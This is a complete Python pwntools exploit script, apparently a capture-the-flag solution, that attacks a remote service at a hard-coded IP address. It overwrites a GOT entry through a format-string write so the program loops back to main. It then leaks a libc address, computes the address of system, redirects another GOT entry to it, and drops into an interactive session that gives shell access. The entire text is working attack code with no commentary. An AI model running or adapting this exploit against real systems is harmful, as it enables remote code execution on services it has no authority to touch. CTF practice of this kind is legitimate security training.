from pwn import *
import re

context.arch = 'amd64'
p = remote('34.104.150.35', 9000)

# Get main Address
payload = fmtstr_payload(6, {0x404020:p64(0x401166)})
p.sendafter(b' ', payload)

# Leak libc address
payload = b'%3$p\n'
p.sendafter(b' ', payload)
leak_address = re.search(rb'0x[0-9a-f]+', p.recvuntil(b'\n')).group(0).decode()
libc_leak = int(leak_address, 16)
print(hex(libc_leak))
libc_base = libc_leak - 0x11ba91
print(hex(libc_base))

# Calculate system address
system_address = libc_base + 0x58750
payload = fmtstr_payload(6, {0x404000: p64(system_address)})
p.sendafter(b' ', payload)

p.interactive()